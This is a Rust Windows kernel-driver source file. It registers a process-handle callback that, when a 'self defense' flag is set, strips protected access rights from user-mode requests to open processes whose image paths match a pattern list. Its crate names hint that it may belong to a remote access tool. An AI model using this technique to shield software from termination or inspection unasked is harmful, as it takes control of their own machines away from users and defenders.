use core::ffi::c_void;
use core::sync::atomic::Ordering;
use core::{mem, ptr, slice};

use rat_common::utils::DropGuard;
use rat_common::windows::PROCESS_PROTECTED_ACCESS;
use rat_common::windows::kernel::KernelHandoff;
use wdk::nt_success;
use wdk_sys::_MODE::UserMode;
use wdk_sys::_OB_PREOP_CALLBACK_STATUS::OB_PREOP_SUCCESS;
use wdk_sys::ntddk::{
    ExFreePool, ExGetPreviousMode, IoGetCurrentProcess, ObRegisterCallbacks, PsGetCurrentProcessId,
    PsGetProcessId, RtlInitUnicodeString, SeLocateProcessImageName,
};
use wdk_sys::{
    OB_CALLBACK_REGISTRATION, OB_FLT_REGISTRATION_VERSION, OB_OPERATION_HANDLE_CREATE,
    OB_OPERATION_REGISTRATION, OB_PRE_OPERATION_INFORMATION, OB_PREOP_CALLBACK_STATUS,
    PsProcessType, UNICODE_STRING,
};
use widestring::U16Str;

use crate::global::{ALTITUDE, OBJ_PATH_AHO_CORASICK, SELF_DEFENSE_ACTIVATED};
use crate::info;

pub fn ob_register_callbacks(extra: &KernelHandoff) -> anyhow::Result<*mut c_void> {
    let mut altitude = UNICODE_STRING::default();
    unsafe {
        RtlInitUnicodeString(&mut altitude, ALTITUDE.as_ptr());
    }

    let mut object_operations = [OB_OPERATION_REGISTRATION {
        ObjectType: unsafe { PsProcessType },
        Operations: OB_OPERATION_HANDLE_CREATE,
        PreOperation: Some(unsafe {
            mem::transmute::<
                *const u8,
                unsafe extern "C" fn(*mut c_void, *mut OB_PRE_OPERATION_INFORMATION) -> i32,
            >(extra.object_callback_trampoline)
        }),
        PostOperation: None,
    }];

    let mut object_callbacks = OB_CALLBACK_REGISTRATION {
        Version: OB_FLT_REGISTRATION_VERSION as u16,
        OperationRegistrationCount: object_operations.len() as u16,
        Altitude: altitude,
        RegistrationContext: ptr::null_mut(),
        OperationRegistration: object_operations.as_mut_ptr(),
    };

    let mut handle = ptr::null_mut();
    let status = unsafe { ObRegisterCallbacks(&mut object_callbacks, &mut handle) };
    anyhow::ensure!(
        nt_success(status),
        "ObRegisterCallbacks error: 0x{status:X}",
    );

    Ok(handle)
}

#[unsafe(no_mangle)]
unsafe extern "C" fn process_preop_callback(
    _: *mut c_void,
    info: *mut OB_PRE_OPERATION_INFORMATION,
) -> OB_PREOP_CALLBACK_STATUS {
    if !SELF_DEFENSE_ACTIVATED.load(Ordering::Acquire) {
        return OB_PREOP_SUCCESS;
    }

    if let Some(info) = unsafe { info.as_mut() }
        && unsafe {
            info.__bindgen_anon_1.__bindgen_anon_1.KernelHandle() == 0
                && i32::from(ExGetPreviousMode()) == UserMode
        }
        && let Some(ac) = unsafe { OBJ_PATH_AHO_CORASICK.load(Ordering::Acquire).as_ref() }
    {
        if unsafe { PsGetCurrentProcessId() == PsGetProcessId(info.Object.cast()) } {
            return OB_PREOP_SUCCESS;
        }

        let mut ctarget = ptr::null_mut();
        let status = unsafe { SeLocateProcessImageName(info.Object.cast(), &mut ctarget) };

        if let Some(target) = unsafe { ctarget.as_ref() }
            && nt_success(status)
        {
            let guard = DropGuard::new(ctarget, |s| unsafe {
                ExFreePool(s.cast());
            });

            let target =
                unsafe { slice::from_raw_parts(target.Buffer.cast(), usize::from(target.Length)) };

            if ac.find(target).is_some()
                && let Some(parameters) = unsafe { info.Parameters.as_mut() }
            {
                let mut csource = ptr::null_mut();
                let status =
                    unsafe { SeLocateProcessImageName(IoGetCurrentProcess(), &mut csource) };

                if let Some(source) = unsafe { csource.as_ref() }
                    && nt_success(status)
                {
                    let guard = DropGuard::new(csource, |s| unsafe {
                        ExFreePool(s.cast());
                    });

                    let name = U16Str::from_slice(unsafe {
                        slice::from_raw_parts(
                            source.Buffer,
                            usize::from(source.Length) / mem::size_of::<u16>(),
                        )
                    });

                    let access = unsafe { &mut parameters.CreateHandleInformation.DesiredAccess };
                    if *access & PROCESS_PROTECTED_ACCESS != 0 {
                        *access &= !PROCESS_PROTECTED_ACCESS;

                        let pid = unsafe { PsGetCurrentProcessId() } as u64;
                        info!("Modified process operation from process {pid} ({name:?})");
                    }

                    drop(guard);
                }
            }

            drop(guard);
        }
    }

    OB_PREOP_SUCCESS
}
